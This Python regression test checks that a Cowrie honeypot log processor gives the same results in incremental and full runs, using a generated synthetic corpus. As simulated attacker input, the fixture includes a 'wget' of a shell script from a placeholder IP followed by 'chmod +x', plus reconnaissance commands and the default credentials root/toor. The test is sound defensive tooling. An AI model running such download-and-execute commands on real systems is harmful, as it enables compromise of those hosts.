#!/usr/bin/env python3
"""
Regression test for Tool 00 --incremental.

Builds a synthetic corpus (rotated plain + .gz Cowrie logs, sessions that
straddle midnight, interleaved unparseable lines, HAProxy/VCN sessions, ties,
login successes, commands, downloads) and checks that an incremental run
reproduces a full run byte-for-byte (full-record archive, corpus_highlights,
historical_stats, corpus_metadata) after EVERY step of three schedules:
all-at-once, in chunks, and one file at a time. Also checks the guards.

Standard library only. Writes to a temp dir. No network. Exit 0 = pass.
"""
import gzip, json, os, random, re, shutil, subprocess, sys, tempfile

HERE = os.path.dirname(os.path.abspath(__file__))
TOOL = os.path.join(HERE, "..", "..", "tools", "00_historical_processor.py")
OUTS = ("full.json", "corpus_highlights.json", "historical_stats.json", "corpus_metadata.json")
FAILS = []


def make_corpus(dst, days=7, sessions=1500, seed=23):
    random.seed(seed)
    cmds = ["uname -a", "cat /proc/cpuinfo", "wget http://1.2.3.4/x.sh", "chmod +x x.sh",
            "echo OK", "crontab -l", "ls -la", "ünï cödé", "id", "w"]
    names = [f"2026-09-{d:02d}" for d in range(1, days + 1)]
    files = {d: [] for d in names}
    ts = lambda day, h, m, s, f=0: f"{day}T{h:02d}:{m:02d}:{s:02d}.{f:06d}Z"
    for n in range(sessions):
        sid = f"{random.getrandbits(48):012x}"
        ip = (random.choice(["10.0.0.73", "10.0.0.5"]) if n % 8 == 0 else
              f"{random.randint(1,60)}.{random.randint(1,30)}.1.{random.randint(1,40)}")
        di = random.randrange(len(names) - 1)
        day, h = names[di], (23 if n % 17 == 0 else random.randint(0, 23))
        ev = [dict(eventid="cowrie.session.connect", session=sid, timestamp=ts(day, h, 0, 0)),
              dict(eventid="cowrie.client.version", session=sid, timestamp=ts(day, h, 0, 1),
                   version=random.choice(["SSH-2.0-libssh_0.9", "SSH-2.0-OpenSSH_8", "SSH-2.0-paramiko_2", ""])),
              dict(eventid="cowrie.client.kex", session=sid, timestamp=ts(day, h, 0, 2),
                   kexAlgs=random.choice(["curve25519", "diffie-hellman-group1-sha1", "x"]),
                   encCS=["aes"], macCS=["hmac"], compCS=["none"])]
        for _ in range(random.randint(1, 4)):
            ev.append(dict(eventid="cowrie.login.failed", session=sid,
                           username=random.choice(["root", "admin", "pi", "x"]),
                           password=random.choice(["1", "x", "pw", "123"]),
                           timestamp=ts(day, h, 1, random.randint(0, 3))))
        if n % 3 == 0:
            ev.append(dict(eventid="cowrie.login.success", session=sid, username="root",
                           password="toor", timestamp=ts(day, h, 2, 0)))
            for c in random.sample(cmds, random.randint(1, 6)):
                ev.append(dict(eventid="cowrie.command.input", session=sid, input=c,
                               timestamp=ts(day, h, 3, random.choice([0, 0, 1]))))
            if n % 9 == 0:
                ev.append(dict(eventid="cowrie.session.file_download", session=sid,
                               url="http://e/x", shasum="ab" * 32, timestamp=ts(day, h, 4, 0)))
        ev.append(dict(eventid="cowrie.session.closed", session=sid, duration="7.5",
                       timestamp=ts(day, h, 5, 0)))
        for e in ev:
            if random.random() < 0.6:
                e["src_ip"] = ip
        if n % 5 == 0:
            ev[-1]["src_ip"] = random.choice(["10.0.0.73", "8.8.8.8"]); ev[0]["src_ip"] = ip
        random.shuffle(ev)
        if n % 13 == 0:      # session straddling midnight: second half lands in next day's file
            ev.sort(key=lambda e: e["timestamp"]); cut = len(ev) // 2
            for e in ev[cut:]:
                e["timestamp"] = ts(names[di + 1], 0, 0, random.randint(0, 5)); files[names[di + 1]].append(e)
            for e in ev[:cut]:
                e["timestamp"] = ts(day, 23, 59, random.randint(50, 59)); files[day].append(e)
        else:
            files[day].extend(ev)
    for i, d in enumerate(names):
        files[d].sort(key=lambda e: e["timestamp"])
        opener = gzip.open if i % 2 else open
        with opener(os.path.join(dst, f"cowrie.json.{d}" + (".gz" if i % 2 else "")), "wt") as f:
            for j, e in enumerate(files[d]):
                f.write(json.dumps(e) + "\n")
                if j % 400 == 0:
                    f.write("not json at all\n\n")
    return sorted(os.listdir(dst))


def run(logdir, out, extra=()):
    os.makedirs(out, exist_ok=True)
    r = subprocess.run([sys.executable, TOOL, "--log-dir", logdir, "--output-dir", out,
                        "--corpus-name", "eq", "--full-records-out", os.path.join(out, "full.json"), *extra],
                       capture_output=True, text=True)
    return r


def norm(b, out):
    b = re.sub(rb'("(?:generated_at|processed_at)": )"[^"]*"', rb'\1"X"', b)
    return b.replace(out.encode(), b"OUT")


def check(cond, label):
    print(f"{'PASS' if cond else 'FAIL'}  {label}")
    if not cond:
        FAILS.append(label)


def stage(src, files, k, dst):
    shutil.rmtree(dst, ignore_errors=True); os.makedirs(dst)
    for f in files[:k]:
        shutil.copy(os.path.join(src, f), dst)


def main():
    tmp = tempfile.mkdtemp(prefix="tool00_inc_")
    try:
        src = os.path.join(tmp, "src"); os.makedirs(src)
        files = make_corpus(src)
        schedules = {"all at once": [len(files)], "chunks": [3, 5, len(files)],
                     "one file at a time": list(range(1, len(files) + 1))}
        for name, steps in schedules.items():
            state = os.path.join(tmp, "state"); shutil.rmtree(state, ignore_errors=True)
            prev_k = 0
            for k in steps:
                logs_i, logs_f = os.path.join(tmp, "li"), os.path.join(tmp, "lf")
                stage(src, files, k, logs_f)
                # the workflow downloads only: 1 context file + provisional file + new files
                shutil.rmtree(logs_i, ignore_errors=True); os.makedirs(logs_i)
                for f in files[max(prev_k - 2, 0):k]:
                    shutil.copy(os.path.join(src, f), logs_i)
                prev_k = k
                oi, of = os.path.join(tmp, "oi"), os.path.join(tmp, "of")
                shutil.rmtree(oi, ignore_errors=True); shutil.rmtree(of, ignore_errors=True)
                rf = run(logs_f, of); ri = run(logs_i, oi, ("--incremental", "--state-dir", state))
                ok = rf.returncode == 0 and ri.returncode == 0 and all(
                    norm(open(os.path.join(of, n), "rb").read(), of).replace(b"lf", b"li")
                    == norm(open(os.path.join(oi, n), "rb").read(), oi).replace(b"lf", b"li") for n in OUTS)
                check(ok, f"{name}: incremental == full after {k} file(s)")

        # no new files -> clean no-op, outputs untouched
        o = os.path.join(tmp, "noop"); st = os.path.join(tmp, "st_noop"); lg = os.path.join(tmp, "l_noop")
        stage(src, files, 3, lg)
        run(lg, o, ("--incremental", "--state-dir", st))
        before = open(os.path.join(o, "full.json"), "rb").read()
        r = run(lg, o, ("--incremental", "--state-dir", st))
        check(r.returncode == 0 and open(os.path.join(o, "full.json"), "rb").read() == before,
              "no new files: exit 0, outputs unchanged")

        # an older file appearing after newer ones must be refused
        lg2 = os.path.join(tmp, "l_old"); stage(src, files, 0, lg2)
        for f in files[2:4]:
            shutil.copy(os.path.join(src, f), lg2)
        st2 = os.path.join(tmp, "st_old"); o2 = os.path.join(tmp, "o_old")
        run(lg2, o2, ("--incremental", "--state-dir", st2))
        shutil.copy(os.path.join(src, files[0]), lg2)
        r = run(lg2, o2, ("--incremental", "--state-dir", st2))
        check(r.returncode != 0 and "older than files already in state" in r.stderr,
              "out-of-order file: refused with a clear message")
    finally:
        shutil.rmtree(tmp, ignore_errors=True)
    if FAILS:
        print(f"\n{len(FAILS)} FAILED"); sys.exit(1)
    print("\nAll checks passed.")


if __name__ == "__main__":
    main()
